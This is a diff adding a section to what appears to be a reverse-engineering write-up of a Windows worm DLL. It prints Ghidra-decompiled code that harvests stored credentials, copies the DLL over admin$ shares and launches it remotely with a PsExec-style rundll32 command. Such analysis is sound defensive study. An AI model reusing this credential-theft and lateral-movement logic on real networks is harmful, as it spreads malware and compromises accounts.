@@ -8416,9 +8416,1241 @@ LAB_10007be1:
 }
 ```
 
+The function starts of with a call to [CredEnumerateW](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew) to ge a list of all the credentials in the user's credential set. The number of credentials is stored in `local_8` and the list of credentials in `local_c` which we will also retype. This cleans up the code a lot.
 
+```cpp
+int FUN_10007b31(LPCRITICAL_SECTION param_1){
+  CREDENTIALW *pCVar1;
+  int iVar2;
+  ushort *puVar3;
+  int iVar4;
+  ushort *puVar5;
+  ushort *puVar6;
+  uint index;
+  int local_10;
+  CREDENTIALW **credentials;
+  DWORD cred_len;
+  
+  credentials = (CREDENTIALW **)0x0;
+  cred_len = 0;
+  iVar2 = CredEnumerateW(0,0,&cred_len,&credentials);
+  if (iVar2 != 0) {
+    index = 0;
+    if (cred_len != 0) {
+      do {
+        pCVar1 = credentials[index];
+        puVar6 = (ushort *)pCVar1->TargetName;
+        if (puVar6 == (ushort *)0x0) {
+LAB_10007bdb:
+          if (pCVar1->Type == 2) goto LAB_10007be1;
+        }
+        else {
+          local_10 = 8;
+          puVar5 = &DAT_100140bc;
+          puVar3 = puVar6;
+          do {
+            if (*puVar3 != *puVar5) {
+              iVar4 = (-(uint)(*puVar3 < *puVar5) & 0xfffffffe) + 1;
+              goto LAB_10007b9f;
+            }
+            puVar3 = puVar3 + 1;
+            puVar5 = puVar5 + 1;
+            local_10 = local_10 + -1;
+          } while (local_10 != 0);
+          iVar4 = 0;
+LAB_10007b9f:
+          if ((iVar4 != 0) || (puVar6 = puVar6 + 8, pCVar1->Type != 1)) goto LAB_10007bdb;
+          if ((pCVar1->UserName != (LPWSTR)0x0) && (pCVar1->CredentialsBlob != (LPBYTE)0x0)) {
+            handle_colon_arg(pCVar1->UserName,(short *)pCVar1->CredentialsBlob,0);
+          }
+LAB_10007be1:
+          possible_lock_and_wait_check_args(param_1,(short *)puVar6,0);
+        }
+        index = index + 1;
+      } while (index < cred_len);
+    }
+    CredFree(credentials);
+  }
+  return iVar2;
+}
+```
 
+We can now clearly see a loop over all of the retrieved credentials. For each credential they are checked to be of type `2`. This maps to `CRED_TYPE_DOMAIN_PASSWORD`, credentials of this type are not processed and passed directly into `possible_lock_and_wait_check_args`. Other credentials first have to pass some more checks, credentials of type `1` meaning `CRED_TYPE_GENERIC` are skipped entirely (as they are not used for authentication anyway most likely). All other credential types as defined in [CREDENTIALW](https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credentialw) are checked to contain a user name and password and then passed to the `handle_colon_arg` subroutine. This also means we now know exactly what type of data this function takes and what is passed on the command line. This being `username:password` style credentials. We also quickly rename and retype things in `handle_colon_arg` to reflect this. After some cleanup the function returns, we will name it `obtain_user_credentials`.
 
+### Back to FUN_10009f8e
+
+Directly after the user credentials function we see a call to `lock_semaphore` with the critical section. This is followed by a call to `FUN_10006f40` with `local_30`.
+
+### FUN_10006f40
+
+`` cpp
+void FUN_10006f40(short *param_1){
+  short sVar1;
+  undefined4 *puVar2;
+  short *psVar3;
+  short **local_8;
+  
+  local_8 = (short **)0x0;
+  puVar2 = FUN_1000711f(0,(int *)&local_8);
+  if (puVar2 != (undefined4 *)0x0) {
+    psVar3 = *local_8;
+    do {
+      sVar1 = *psVar3;
+      *param_1 = sVar1;
+      psVar3 = psVar3 + 1;
+      param_1 = param_1 + 1;
+    } while (sVar1 != 0);
+  }
+  return;
+}
+```
+
+Pretty much the first thing we see in this function is a call to `FUN_1000711f`.
+
+### FUN_1000711f
+
+```cpp
+undefined4 * FUN_1000711f(undefined4 param_1,int *param_2){
+  HANDLE hHeap;
+  int iVar1;
+  undefined4 *puVar2;
+  DWORD dwFlags;
+  SIZE_T dwBytes;
+  undefined4 *lpMem;
+  
+  dwBytes = 8;
+  dwFlags = 8;
+  hHeap = GetProcessHeap();
+  lpMem = (undefined4 *)HeapAlloc(hHeap,dwFlags,dwBytes);
+  puVar2 = lpMem;
+  if (lpMem != (undefined4 *)0x0) {
+    *lpMem = 0;
+    lpMem[1] = param_1;
+    iVar1 = FUN_10007167(param_2);
+    if (iVar1 == 0) {
+      puVar2 = (undefined4 *)0x0;
+      dwFlags = 0;
+      hHeap = GetProcessHeap();
+      HeapFree(hHeap,dwFlags,lpMem);
+    }
+  }
+  return puVar2;
+}
+```
+
+This function allocates some memory and then proceeds to call `FUN_10007167` with `param_2`.
+
+### FUN_10007167
+
+int FUN_10007167(int *param_1){
+  HANDLE pvVar1;
+  int iVar2;
+  uint uVar3;
+  HANDLE *unaff_EBX;
+  LPCRITICAL_SECTION unaff_ESI;
+  int iVar4;
+  
+  if ((unaff_EBX == (HANDLE *)0x0) || (unaff_ESI == (LPCRITICAL_SECTION)0x0)) {
+    return 0;
+  }
+  do {
+    iVar4 = 0;
+    EnterCriticalSection(unaff_ESI);
+    do {
+      pvVar1 = *unaff_EBX;
+      if (unaff_ESI[1].OwningThread <= pvVar1) break;
+      iVar2 = *(int *)(&(unaff_ESI[1].DebugInfo)->Type + (int)pvVar1 * 2);
+      uVar3 = *(uint *)(iVar2 + 4);
+      if ((uVar3 == 0) || (((uint)unaff_EBX[1] & uVar3) != 0)) {
+        iVar4 = 1;
+        if (param_1 != (int *)0x0) {
+          *param_1 = iVar2;
+        }
+      }
+      else {
+        iVar4 = 0;
+      }
+      *unaff_EBX = (HANDLE)((int)pvVar1 + 1);
+    } while (iVar4 == 0);
+    LeaveCriticalSection(unaff_ESI);
+    if (iVar4 != 0) {
+      return iVar4;
+    }
+    if (unaff_ESI[1].LockSemaphore != (HANDLE)0x0) {
+      return 0;
+    }
+    Sleep(10000);
+  } while( true );
+}
+```
+
+The first thing we notice is that data was supposed to be passed via `EBX` and `ESI` so we will add custom storage for these.
+
+```cpp
+int FUN_10007167(int *param_1,HANDLE *param_2,LPCRITICAL_SECTION param_3){
+  HANDLE pvVar1;
+  int iVar2;
+  uint uVar3;
+  int iVar4;
+  
+  if ((param_2 == (HANDLE *)0x0) || (param_3 == (LPCRITICAL_SECTION)0x0)) {
+    return 0;
+  }
+  do {
+    iVar4 = 0;
+    EnterCriticalSection(param_3);
+    do {
+      pvVar1 = *param_2;
+      if (param_3[1].OwningThread <= pvVar1) break;
+      iVar2 = *(int *)(&(param_3[1].DebugInfo)->Type + (int)pvVar1 * 2);
+      uVar3 = *(uint *)(iVar2 + 4);
+      if ((uVar3 == 0) || (((uint)param_2[1] & uVar3) != 0)) {
+        iVar4 = 1;
+        if (param_1 != (int *)0x0) {
+          *param_1 = iVar2;
+        }
+      }
+      else {
+        iVar4 = 0;
+      }
+      *param_2 = (HANDLE)((int)pvVar1 + 1);
+    } while (iVar4 == 0);
+    LeaveCriticalSection(param_3);
+    if (iVar4 != 0) {
+      return iVar4;
+    }
+    if (param_3[1].LockSemaphore != (HANDLE)0x0) {
+      return 0;
+    }
+    Sleep(10000);
+  } while( true );
+}
+```
+
+We then see some more logic that looks really similar to the synchronisation logic in the `possible_lock` functions. In particular there's a loop that runs while `param_1` is not `NULL` and this loop does not appear to have any other function. So we will rename the function to `wait_for_null`.
+
+### back to FUN_1000711f
+
+```cpp
+undefined4 * FUN_1000711f(undefined4 param_1,int *param_2){
+  HANDLE hHeap;
+  int iVar1;
+  undefined4 *puVar2;
+  LPCRITICAL_SECTION unaff_ESI;
+  DWORD dwFlags;
+  SIZE_T dwBytes;
+  undefined4 *lpMem;
+  
+  dwBytes = 8;
+  dwFlags = 8;
+  hHeap = GetProcessHeap();
+  lpMem = (undefined4 *)HeapAlloc(hHeap,dwFlags,dwBytes);
+  puVar2 = lpMem;
+  if (lpMem != (undefined4 *)0x0) {
+    *lpMem = 0;
+    lpMem[1] = param_1;
+    iVar1 = wait_for_null(param_2,lpMem,unaff_ESI);
+    if (iVar1 == 0) {
+      puVar2 = (undefined4 *)0x0;
+      dwFlags = 0;
+      hHeap = GetProcessHeap();
+      HeapFree(hHeap,dwFlags,lpMem);
+    }
+  }
+  return puVar2;
+}
+```
+
+Back we see that we will have to setup custom storage for the critical section in this function too before we can continue.
+
+```cpp
+undefined4 * FUN_1000711f(undefined4 param_1,int *param_2,LPCRITICAL_SECTION param_3){
+  HANDLE hHeap;
+  int iVar1;
+  undefined4 *puVar2;
+  DWORD dwFlags;
+  SIZE_T dwBytes;
+  undefined4 *lpMem;
+  
+  dwBytes = 8;
+  dwFlags = 8;
+  hHeap = GetProcessHeap();
+  lpMem = (undefined4 *)HeapAlloc(hHeap,dwFlags,dwBytes);
+  puVar2 = lpMem;
+  if (lpMem != (undefined4 *)0x0) {
+    *lpMem = 0;
+    lpMem[1] = param_1;
+    iVar1 = wait_for_null(param_2,lpMem,param_3);
+    if (iVar1 == 0) {
+      puVar2 = (undefined4 *)0x0;
+      dwFlags = 0;
+      hHeap = GetProcessHeap();
+      HeapFree(hHeap,dwFlags,lpMem);
+    }
+  }
+  return puVar2;
+}
+```
+
+The final part of this function just checks the success code of `wait_for_null` and then frees the allocated memory again. It it not entirely clear what was being waited for so we will just rename the function to `wait_for_something`.
+
+### Back to FUN_10006f40
+
+```cpp
+void FUN_10006f40(short *param_1){
+  short sVar1;
+  undefined4 *puVar2;
+  undefined4 in_ECX;
+  short *psVar3;
+  short **local_8;
+  
+  local_8 = (short **)0x0;
+  puVar2 = wait_for_something(0,(int *)&local_8,in_ECX);
+  if (puVar2 != (undefined4 *)0x0) {
+    psVar3 = *local_8;
+    do {
+      sVar1 = *psVar3;
+      *param_1 = sVar1;
+      psVar3 = psVar3 + 1;
+      param_1 = param_1 + 1;
+    } while (sVar1 != 0);
+  }
+  return;
+}
+```
+
+Back we see that we again have to setup some custom storage.
+
+```
+void FUN_10006f40(short *param_1,LPCRITICAL_SECTION param_2){
+  short sVar1;
+  undefined4 *puVar2;
+  short *psVar3;
+  short **local_8;
+  
+  local_8 = (short **)0x0;
+  puVar2 = wait_for_something(0,(int *)&local_8,param_2);
+  if (puVar2 != (undefined4 *)0x0) {
+    psVar3 = *local_8;
+    do {
+      sVar1 = *psVar3;
+      *param_1 = sVar1;
+      psVar3 = psVar3 + 1;
+      param_1 = param_1 + 1;
+    } while (sVar1 != 0);
+  }
+  return;
+}
+```
+
+The function ends with a loop over what was returned in `local_8`. The content of which is copied into `param_1`. Unfortunately, we still do not know what was being waited for. On the other hand it has to be something passed via this specific critical section objectain which only really leaves the functions we previously looked at that called `possible_lock`. At the very least we have finally found a function that creads from this lock instead of writing to it as all the function we have found until now did. We will also make a small change and rename `wait_for_something` to `wait_for_something_read_crit`.
+
+We will rename `FUN_10006f40` to `read_crit_sect`.
+
+### Back to FUN_10009f8e
+
+Back we see that as expected the custom storage we added passes the `crit_section` now as an argument.
+
+Assuming there were no issues we see that `FUN_10009987` is called with `local_30` which is what we just read from the critical section. Which means that probably either IPs or usernames and passwords are passed or both. All other arguments are passed as `NULL`.
+
+### FUN_10009987
+
+```cpp
+uint FUN_10009987(int param_1,LPCWSTR param_2,LPCWSTR param_3,DWORD *param_4){
+  bool bVar1;
+  LPWSTR pWVar2;
+  BOOL OpenAsSelf;
+  HANDLE ThreadHandle;
+  int iVar3;
+  DWORD *pDVar4;
+  DWORD DesiredAccess;
+  HANDLE *TokenHandle;
+  int iStack72388;
+  uint uStack72384;
+  DWORD DStack72380;
+  HANDLE pvStack72376;
+  HANDLE pvStack72372;
+  DWORD DStack72368;
+  DWORD DStack72364;
+  _PROCESS_INFORMATION _Stack72360;
+  DWORD DStack72344;
+  undefined auStack72340 [40];
+  DWORD DStack72300;
+  WORD WStack72296;
+  HANDLE pvStack72288;
+  HANDLE pvStack72284;
+  HANDLE pvStack72280;
+  _NETRESOURCEW _Stack72272;
+  WCHAR aWStack72240 [260];
+  undefined auStack71720 [520];
+  WCHAR aWStack71200 [780];
+  WCHAR aWStack69640 [1024];
+  WCHAR aWStack67592 [1024];
+  WCHAR aWStack65544 [32766];
+  undefined4 uStack12;
+  
+  uStack12 = 0x10009997;
+  bVar1 = false;
+  uStack72384 = 0;
+  DStack72380 = 0;
+  DStack72364 = 0;
+  if (param_1 == 0) {
+    DStack72380 = 0x57;
+  }
+  else {
+    aWStack72240[0] = L'\0';
+    wsprintfW(aWStack72240,L"\\\\%s\\admin$",param_1);
+    iVar3 = 7;
+    _Stack72272.dwScope = 0;
+    pDVar4 = &_Stack72272.dwType;
+    while (iVar3 != 0) {
+      iVar3 = iVar3 + -1;
+      *pDVar4 = 0;
+      pDVar4 = pDVar4 + 1;
+    }
+    _Stack72272.lpRemoteName = aWStack72240;
+    _Stack72272.dwType = 1;
+    FUN_10008b70((int)auStack71720);
+    wsprintfW(aWStack67592,L"\\\\%ws\\admin$\\%ws",param_1,auStack71720);
+    while( true ) {
+      aWStack69640[0] = L'\0';
+      DStack72364 = WNetAddConnection2W((LPNETRESOURCEW)&_Stack72272,param_3,param_2,0);
+      wsprintfW(aWStack69640,L"\\\\%ws\\admin$\\%ws",param_1,auStack71720);
+      pWVar2 = PathFindExtensionW(aWStack69640);
+      if (pWVar2 != (LPWSTR)0x0) {
+        *pWVar2 = L'\0';
+        OpenAsSelf = PathFileExistsW(aWStack69640);
+        if (OpenAsSelf != 0) {
+          uStack72384 = 1;
+          goto LAB_10009d7c;
+        }
+        DStack72380 = GetLastError();
+      }
+      iVar3 = write_data_to_file(aWStack67592,malware_dll_buffer,1,malware_dll_buffer_size_bytes);
+      if (iVar3 != 0) {
+        if ((param_2 != (LPCWSTR)0x0) && (param_3 != (LPCWSTR)0x0)) {
+          FUN_10006ce7(param_2,param_3);
+          _DAT_10016010 = 1;
+        }
+        TokenHandle = &pvStack72372;
+        OpenAsSelf = 1;
+        DesiredAccess = 2;
+        pvStack72372 = (HANDLE)0x0;
+        pvStack72376 = (HANDLE)0x0;
+        ThreadHandle = GetCurrentThread();
+        OpenAsSelf = OpenThreadToken(ThreadHandle,DesiredAccess,OpenAsSelf,TokenHandle);
+        if (OpenAsSelf != 0) {
+          DuplicateTokenEx(pvStack72372,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,
+                           TokenPrimary,&pvStack72376);
+        }
+        iStack72388 = 0;
+        goto LAB_10009b82;
+      }
+      DStack72380 = GetLastError();
+      if ((((DStack72380 == 0x50) || (DStack72380 == 0x35)) || (DStack72380 == 0x43)) ||
+         (DStack72364 != 0x4c3)) goto LAB_10009d7c;
+      if (bVar1) break;
+      bVar1 = true;
+      WNetCancelConnection2W(aWStack72240,0,1);
+    }
+  }
+  goto LAB_10009d9f;
+LAB_10009b82:
+  if (uStack72384 != 0) goto LAB_10009d58;
+  aWStack65544[0] = L'\0';
+  aWStack71200[0] = L'\0';
+  _Stack72360.hProcess = (HANDLE)0x0;
+  _Stack72360.hThread = (HANDLE)0x0;
+  _Stack72360.dwProcessId = 0;
+  _Stack72360.dwThreadId = 0;
+  memset(&DStack72344 + 4,0,0x40);
+  DStack72344 = 0x44;
+  DStack72300 = 1;
+  WStack72296 = 0;
+  if (iStack72388 == 0) {
+    FUN_100097a5(aWStack71200,param_1);
+  }
+  if (iStack72388 == 1) {
+    if ((param_2 == (LPCWSTR)0x0) || (param_3 == (LPCWSTR)0x0)) goto LAB_10009d4a;
+    FUN_100098ab(aWStack71200,param_1,param_2,param_3);
+  }
+  if ((aWStack65544[0] == L'\0') || (aWStack71200[0] == L'\0')) {
+LAB_10009d2b:
+    DStack72380 = GetLastError();
+  }
+  else {
+    if (pvStack72376 == (HANDLE)0x0) {
+      iVar3 = CreateProcessW(aWStack71200,aWStack65544,(LPSECURITY_ATTRIBUTES)0x0,
+                             (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,
+                             (LPSTARTUPINFOW)&DStack72344,(LPPROCESS_INFORMATION)&_Stack72360);
+    }
+    else {
+      iVar3 = CreateProcessAsUserW
+                        (pvStack72376,aWStack71200,aWStack65544,(LPSECURITY_ATTRIBUTES)0x0,
+                         (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,
+                         (LPSTARTUPINFOW)&DStack72344,(LPPROCESS_INFORMATION)&_Stack72360);
+    }
+    if (iVar3 == 0) goto LAB_10009d2b;
+    WaitForSingleObject(_Stack72360.hProcess,0xffffffff);
+    DStack72368 = 0;
+    GetExitCodeProcess(_Stack72360.hProcess,&DStack72368);
+    if (pvStack72280 != (HANDLE)0x0) {
+      CloseHandle(pvStack72280);
+    }
+    if (pvStack72288 != (HANDLE)0x0) {
+      CloseHandle(pvStack72288);
+    }
+    if (pvStack72284 != (HANDLE)0x0) {
+      CloseHandle(pvStack72284);
+    }
+    if (_Stack72360.hThread != (HANDLE)0x0) {
+      CloseHandle(_Stack72360.hThread);
+    }
+    if (_Stack72360.hProcess != (HANDLE)0x0) {
+      CloseHandle(_Stack72360.hProcess);
+    }
+    if (iStack72388 == 0) {
+      if ((DStack72368 == 0) || ((DStack72368 & 3) != 0)) {
+LAB_10009d17:
+        uStack72384 = PathFileExistsW(aWStack69640);
+      }
+      else {
+        uStack72384 = 1;
+      }
+    }
+    else {
+      if ((iStack72388 != 1) || (uStack72384 = (uint)(DStack72368 == 0), DStack72368 != 0))
+      goto LAB_10009d17;
+    }
+  }
+  iStack72388 = iStack72388 + 1;
+  if (1 < iStack72388) goto code_r0x10009d44;
+  goto LAB_10009b82;
+code_r0x10009d44:
+  if (uStack72384 == 0) {
+LAB_10009d4a:
+    DeleteFileW(aWStack67592);
+  }
+LAB_10009d58:
+  if (pvStack72376 != (HANDLE)0x0) {
+    CloseHandle(pvStack72376);
+    pvStack72376 = (HANDLE)0x0;
+  }
+  if (pvStack72372 != (HANDLE)0x0) {
+    CloseHandle(pvStack72372);
+  }
+LAB_10009d7c:
+  if (DStack72364 == 0) {
+    WNetCancelConnection2W(aWStack72240,0,1);
+  }
+LAB_10009d9f:
+  if (param_4 != (DWORD *)0x0) {
+    *param_4 = DStack72364;
+  }
+  SetLastError(DStack72380);
+  return uStack72384;
+}
+```
+
+The first we see happen is a format string being made of the form `\\%s\admin$` with `%s` being the first argument passed to the function. This is the path for a [default share always created by Windows](http://www.intelliadmin.com/index.php/2007/10/the-admin-share-explained/), the `$` at the end is to tell Windows to hide the share. This share specifically points to the `C:\Windows` folder on a system and is usually used for remote software deployment via the network. Of course to access is administrator reights are required. This also means that `param_1` is the remote host name.
+
+Next we see a call into `FUN_10008b70` with `auStack71720` which is not yet assigned a value as far as we know.
+
+### FUN_10008b70
+
+```cpp
+undefined4 FUN_10008b70(int param_1){
+  WCHAR WVar1;
+  LPWSTR pWVar2;
+  LPWSTR pWVar3;
+  undefined4 uVar4;
+  
+  uVar4 = 0;
+  if (param_1 != 0) {
+    pWVar2 = PathFindFileNameW(&dll_fully_qualified_path);
+    if (pWVar2 != (LPWSTR)0x0) {
+      pWVar3 = pWVar2;
+      do {
+        WVar1 = *pWVar3;
+        pWVar3 = pWVar3 + 1;
+      } while (WVar1 != L'\0');
+      if ((uint)((int)((int)pWVar3 - (int)(pWVar2 + 1)) >> 1) < 0x104) {
+        param_1 = param_1 - (int)pWVar2;
+        do {
+          WVar1 = *pWVar2;
+          *(WCHAR *)(param_1 + (int)pWVar2) = WVar1;
+          pWVar2 = pWVar2 + 1;
+        } while (WVar1 != L'\0');
+        uVar4 = 1;
+      }
+    }
+  }
+  return uVar4;
+}
+```
+
+Interestingly this function first gets the name of the dll file. Then a length check is performed to see if the name length is less than `0x104` and finally the name is copied into `param_1`. Meaning we can rename the function to `get_dll_filename`.
+
+### Back to FUN_10009987
+
+Back we rename the variable that now holds the `dll_file_name` and next we see a new format string being created following the format `\\%host\admin$\%dll`. With `%host` the remote host and `%dll` the dll file name just obtained. This effectively maps to `C:\Windows\%dll` on the remote host.
+
+Next we see a large infinite white loop that start with a call to [WNetAddConnection2W](https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w) this function open a connection to a network resource. This call also reveals that `param_3` is a password and `param_2` a username (should be noted that that means that the way this function is invoked seems off, on the other hand this is an infinite while loop with more stuff going on). The resource being connected to is the admin share.
+
+Next, assuming the connection worked out, we see a check to see if the previously mentioned dll path already exists, it should be noted that the extension of the dll file is ignored while doing this (so really only a name check, extension is irrelevant).
+
+**If the file already exists, the connection is closed immediately and the function returns**
+
+So this is effectively a kill switch for this method of spreading (which will happen next).
+
+Given that the file did not already exist we then see that the global `malware_dll_buffer` we have stored in memroy is written to the remote location on the admin share.
+
+If this worked we see `FUN_10006ce7` being invoked with the username and password that were used to write the dll over.
+
+### FUN_10006ce7
+
+```cpp
+undefined4 FUN_10006ce7(short *param_1,short *param_2){
+  short sVar1;
+  HANDLE hHeap;
+  short *psVar2;
+  DWORD dwFlags;
+  SIZE_T dwBytes;
+  LPVOID lpMem;
+  LPVOID local_14;
+  LPVOID local_10;
+  undefined4 local_c;
+  undefined4 local_8;
+  
+  local_8 = 0;
+  local_c = critical_section_with_extra_debug;
+  psVar2 = param_1;
+  do {
+    sVar1 = *psVar2;
+    psVar2 = psVar2 + 1;
+  } while (sVar1 != 0);
+  dwBytes = ((int)((int)psVar2 - (int)(param_1 + 1)) >> 1) * 2 + 2;
+  dwFlags = 8;
+  hHeap = GetProcessHeap();
+  local_14 = HeapAlloc(hHeap,dwFlags,dwBytes);
+  if (local_14 != (LPVOID)0x0) {
+    psVar2 = param_1;
+    do {
+      sVar1 = *psVar2;
+      psVar2 = psVar2 + 1;
+    } while (sVar1 != 0);
+    memcpy(local_14,param_1,((int)((int)psVar2 - (int)(param_1 + 1)) >> 1) * 2 + 2);
+    psVar2 = param_2;
+    do {
+      sVar1 = *psVar2;
+      psVar2 = psVar2 + 1;
+    } while (sVar1 != 0);
+    dwBytes = ((int)((int)psVar2 - (int)(param_2 + 1)) >> 1) * 2 + 2;
+    dwFlags = 8;
+    hHeap = GetProcessHeap();
+    local_10 = HeapAlloc(hHeap,dwFlags,dwBytes);
+    if (local_10 != (LPVOID)0x0) {
+      psVar2 = param_2;
+      do {
+        sVar1 = *psVar2;
+        psVar2 = psVar2 + 1;
+      } while (sVar1 != 0);
+      memcpy(local_10,param_2,((int)((int)psVar2 - (int)(param_2 + 1)) >> 1) * 2 + 2);
+      local_8 = FUN_1000724d(&local_14);
+      dwFlags = 0;
+      lpMem = local_10;
+      hHeap = GetProcessHeap();
+      HeapFree(hHeap,dwFlags,lpMem);
+    }
+    dwFlags = 0;
+    lpMem = local_14;
+    hHeap = GetProcessHeap();
+    HeapFree(hHeap,dwFlags,lpMem);
+  }
+  return local_8;
+}
+```
+
+This function starts by allocating some memory. Specifically, enough to store the username. Next the username is copied into the allocated memory.
+
+Next we see exactly the same happen but this time for the password.
+
+Finally we see a call to `FUN_1000724d` seeminly only passing the `username`.
+
+### FUN_1000724d
+
+```cpp
+int FUN_1000724d(undefined4 param_1){
+  LPCRITICAL_SECTION in_EAX;
+  uint uVar1;
+  uint *unaff_EBX;
+  int iVar2;
+  int local_8;
+  
+  iVar2 = 0;
+  if (in_EAX != (LPCRITICAL_SECTION)0x0) {
+    EnterCriticalSection(in_EAX);
+    uVar1 = 0;
+    local_8 = 0;
+    if (unaff_EBX != (uint *)0x0) {
+      uVar1 = *unaff_EBX;
+    }
+    iVar2 = possible_lock(param_1,&local_8,in_EAX,uVar1);
+    if (iVar2 != 0) {
+      *(undefined4 *)(local_8 + 4) = 1;
+    }
+    LeaveCriticalSection(in_EAX);
+  }
+  return iVar2;
+}
+```
+
+The first thing we notice is that data is passed in via `EAX` and `EBX`. `EBX` is most likely the password, but we'll find out soon after we setup custom storage.
+
+```cpp
+int FUN_1000724d(undefined4 param_1,LPCRITICAL_SECTION param_2,uint *param_3){
+  uint uVar1;
+  int iVar2;
+  int local_8;
+  
+  iVar2 = 0;
+  if (param_2 != (LPCRITICAL_SECTION)0x0) {
+    EnterCriticalSection(param_2);
+    uVar1 = 0;
+    local_8 = 0;
+    if (param_3 != (uint *)0x0) {
+      uVar1 = *param_3;
+    }
+    iVar2 = possible_lock(param_1,&local_8,param_2,uVar1);
+    if (iVar2 != 0) {
+      *(undefined4 *)(local_8 + 4) = 1;
+    }
+    LeaveCriticalSection(param_2);
+  }
+  return iVar2;
+}
+```
+
+It appears as if the function calls `possible_lock` with the `username`, critical section, `local_8` and `uVar1` which appears to be a pointer to `param_3`. We will rename the function to `pass_credentials`.
+
+### Back to FUN_10006ce7
+
+Back at the calling side it seems that the password was never passed and is instead just allocated then freed, although it's probably not worth investigating. It is highly likely that Ghidra just failed to figure out how it was passed to the `pass_credentials` function given the context and previous call to the lock functions.
+
+Although again the exact purpose is unclear, we will rename the function to `pass_credentials_to_lock` (my guess would be that this is part of the logic to execute the malware file on the remote host).
+
+### Back to FUN_10009987
+
+After the credentials passing function we see the current thread token being opened again and duplicated. Nothing appears to be done with the token copy immediately.
+
+This section ends with a goto statement to `LAB_10009b82` which is just outside the infinite while loop. More execution paths exist that handle various errors, but for now we will just assume everything goes as planned.
+
+The part at the label we end up at now seems to initialise `aWStack71200` before passing it to `FUN_100097a5` together with the `host`.
+
+### FUN_100097a5
+
+```
+undefined4 __thiscall FUN_100097a5(void *this,undefined4 param_1){
+  short sVar1;
+  short *psVar2;
+  BOOL BVar3;
+  int iVar4;
+  int iVar5;
+  uint uVar6;
+  void *pvVar7;
+  LPWSTR unaff_EBX;
+  uint uVar8;
+  WCHAR local_4214 [8192];
+  undefined local_214 [520];
+  undefined4 local_c;
+  DWORD local_8;
+  
+  local_8 = 0x100097b2;
+  *unaff_EBX = L'\0';
+  *(undefined2 *)this = 0;
+  uVar8 = 0;
+  local_c = 0;
+  get_dll_filename((int)local_214);
+  local_8 = 0;
+  if (dllhost_path == (short *)0x0) {
+    local_8 = 3;
+  }
+  else {
+    psVar2 = dllhost_path;
+    do {
+      sVar1 = *psVar2;
+      psVar2 = psVar2 + 1;
+    } while (sVar1 != 0);
+    uVar8 = (int)((int)psVar2 - (int)(dllhost_path + 1)) >> 1;
+    if (uVar8 < 0x105) {
+      pvVar7 = (void *)((int)this - (int)dllhost_path);
+      psVar2 = dllhost_path;
+      do {
+        sVar1 = *psVar2;
+        *(short *)((int)pvVar7 + (int)psVar2) = sVar1;
+        psVar2 = psVar2 + 1;
+      } while (sVar1 != 0);
+    }
+    else {
+      local_8 = 0x7a;
+    }
+  }
+  SetLastError(local_8);
+  if ((uVar8 == 0) || (BVar3 = PathFileExistsW((LPCWSTR)this), BVar3 == 0)) {
+    *unaff_EBX = L'\0';
+    *(undefined2 *)this = 0;
+  }
+  else {
+    iVar4 = wsprintfW(unaff_EBX,L"%s \\\\%s -accepteula -s ",this,param_1);
+    iVar5 = wsprintfW(unaff_EBX + iVar4,
+                      L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ",local_214);
+    uVar6 = FUN_10006bb0(local_4214);
+    uVar8 = 0x1fff;
+    if (uVar6 + 1 < 0x2000) {
+      uVar8 = uVar6 + 1;
+    }
+    memcpy(unaff_EBX + iVar4 + iVar5,local_4214,uVar8 * 2);
+    local_c = 1;
+  }
+  return local_c;
+}
+```
+
+The first thing we notice is that this is C++ code. The second that something is passed via `EBX`.
+
+Something is revealed to be `aWStack65544` whcih similar to `aWStack71200` is a `NUl` terminated string.
+
+```cpp
+undefined4 __thiscall FUN_100097a5(void *this,undefined4 param_2,LPWSTR param_3){
+  short sVar1;
+  short *psVar2;
+  BOOL BVar3;
+  int iVar4;
+  int iVar5;
+  uint uVar6;
+  void *pvVar7;
+  uint uVar8;
+  WCHAR local_4214 [8192];
+  undefined local_214 [520];
+  undefined4 local_c;
+  DWORD local_8;
+  
+  local_8 = 0x100097b2;
+  *param_3 = L'\0';
+  *(undefined2 *)this = 0;
+  uVar8 = 0;
+  local_c = 0;
+  get_dll_filename((int)local_214);
+  local_8 = 0;
+  if (dllhost_path == (short *)0x0) {
+    local_8 = 3;
+  }
+  else {
+    psVar2 = dllhost_path;
+    do {
+      sVar1 = *psVar2;
+      psVar2 = psVar2 + 1;
+    } while (sVar1 != 0);
+    uVar8 = (int)((int)psVar2 - (int)(dllhost_path + 1)) >> 1;
+    if (uVar8 < 0x105) {
+      pvVar7 = (void *)((int)this - (int)dllhost_path);
+      psVar2 = dllhost_path;
+      do {
+        sVar1 = *psVar2;
+        *(short *)((int)pvVar7 + (int)psVar2) = sVar1;
+        psVar2 = psVar2 + 1;
+      } while (sVar1 != 0);
+    }
+    else {
+      local_8 = 0x7a;
+    }
+  }
+  SetLastError(local_8);
+  if ((uVar8 == 0) || (BVar3 = PathFileExistsW((LPCWSTR)this), BVar3 == 0)) {
+    *param_3 = L'\0';
+    *(undefined2 *)this = 0;
+  }
+  else {
+    iVar4 = wsprintfW(param_3,L"%s \\\\%s -accepteula -s ",this,param_2);
+    iVar5 = wsprintfW(param_3 + iVar4,
+                      L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ",local_214);
+    uVar6 = FUN_10006bb0(local_4214);
+    uVar8 = 0x1fff;
+    if (uVar6 + 1 < 0x2000) {
+      uVar8 = uVar6 + 1;
+    }
+    memcpy(param_3 + iVar4 + iVar5,local_4214,uVar8 * 2);
+    local_c = 1;
+  }
+  return local_c;
+}
+```
+
+We see that this function agian starts off by getting the name of the dll file followed by the path of `dllhost`. After a lot of checks and copies we see a file path being checked for `this`. `this` is the first parameter passed to the function. And after all the earlier functions appears to hold the `dllhost_path`. If the file exists we see some command strings being created.
+
+First the string `%dllhost \\%host -accepteula -s ` is created. To this we then see the following being appended forming a total string of `%dllhost \\%host -accepteula -s -d:\Windows\System32\rundll32.exe "C:\Windows\%dll\,#1 `. Roughly what this call does is start the malware dll, specifically by invoking `Ordinal_1`, this confirms that `Ordinal_1` is the root function of the malware.
+
